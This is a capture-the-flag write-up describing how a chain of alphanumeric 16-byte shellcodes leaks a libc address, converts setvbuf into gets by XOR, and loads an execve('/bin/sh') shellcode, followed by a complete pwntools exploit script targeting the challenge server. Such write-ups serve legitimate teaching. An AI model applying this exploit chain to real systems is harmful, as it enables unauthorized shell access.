This is the second of two challenges.

This one is more restricted than the first.

You can save shellcode up to 16bytes, alphanumeric only then execute up to 6 of them.

The return value in EAX of shellcode is printed in hexadecimal after the shellcode execution.

Unlike the first of the serie, there is no argument that can be passed to the shellcode.

The shellcodes are executed in a RWX segment.

When entering the shellcode we saw that:

* EAX point to the mapped zone (shellcode called by a call eax)
* EDX points to the end of the shellcode (EAX+16 so)
* EBX point to the GOT (fullrelro , non writable)

Our strategy will be:

First we dump some GOT entries to identify the remote libc version
then we use https://libc.blukat.me/ website to identify it.

it was:  libc6-i386_2.23-0ubuntu11.2_amd64.so
same version than the first challenge.

So now that we know the libc version,
* setvbuf function offset in libc is 0x5f810
* gets function offset in libc is 0x5e8a0

so if we read setvbuf address, and do a xor 0x10b0 on it.. we will have gets address,

but off course we can not write in GOT as the executable is FULLRELRO.

we gonna send a first alphanumeric shellcode to read the GOT entry of setup,

then store it further in the shellcode mapped zone , for the others shellcode usage..

then the two next shellcodes, we xor the lsb with 0xb0,  then the second byte with 0x10

now our stored address is changed to gets function address.



The last shellcode will, get back this value, push our mapped zone address on stack, 

to use as gets function argument. then return to gets..

Then we will send a normal shellcode this time, with no restrictions, only the carriage return will end gets input.

We will write on the mapped shellcode zone where we are, then we return to it..

The last payload will be a execve('/bin/sh') shellcode, the one from pwntools.

And...Badaboom !

We got shell ;)

*Nobodyisnobody for RootMeUpBeforeYouGoGo

```
from pwn import *

host, port = "151.236.114.211", "17183"
context.arch = 'i386'

def save_shellcode(shellcode):
    r.sendlineafter("> ", "1")
    r.sendafter("shellcode: ", shellcode)

def run_shellcode(idx):
    r.sendlineafter("> ", "4")
    r.sendlineafter("idx: ", str(idx))

# first shellcode get setvbuf address in got, and store it for later
sc1 = asm("""
    push 0x41
    pop eax
    xor eax,[ebx+0x30]
    xor al,0x41
    xor [edx+0x30],eax
""")
# 2nd shellcode xor lsb byte of stored address
sc2 = asm("""
	push 0x41
	pop eax
	xor al,0x41
	dec eax
	xor	al,0x4f
	xor	[edx+0x30],al
""")
# 3rd shellcode xor second byte of stored address
sc3 = asm("""
	push 0x41
	pop	eax
	xor al,0x51
    xor     [edx+0x31],al
""")

# now the stored setvbuf address is changed to gets address, we call gets on ourselves, execution will continue in our second shellcode
sc4 = asm("""
	push 0x41
	pop	eax
	xor al,0x41
	xor eax,[edx+0x30]
	push edx
	push edx
	push eax
""")

# pad the shellcodes to the right length
sc1 = sc1.ljust(16,'O')
sc2 = sc2.ljust(16,'O')
sc3 = sc3.ljust(16,'O')
sc4 = sc4.ljust(16,'O')

r = remote(host, port)

# send 1st shellcode
save_shellcode(sc1)
run_shellcode(0)
# leak setvbuf (not really needed, just for info)
leak1 = int(r.recvuntil("===", drop=True).splitlines()[0].split(' = ')[1],16)
print('leak setvbuf = '+hex(leak1))
# send 2nd shellcode
save_shellcode(sc2)
run_shellcode(1)
# send 3rd shellcode
save_shellcode(sc3)
run_shellcode(2)
# send last shellcode
save_shellcode(sc4)
run_shellcode(3)
# send second payload
r.sendline(asm(shellcraft.linux.sh()))

#enjoy shell
r.interactive()

```

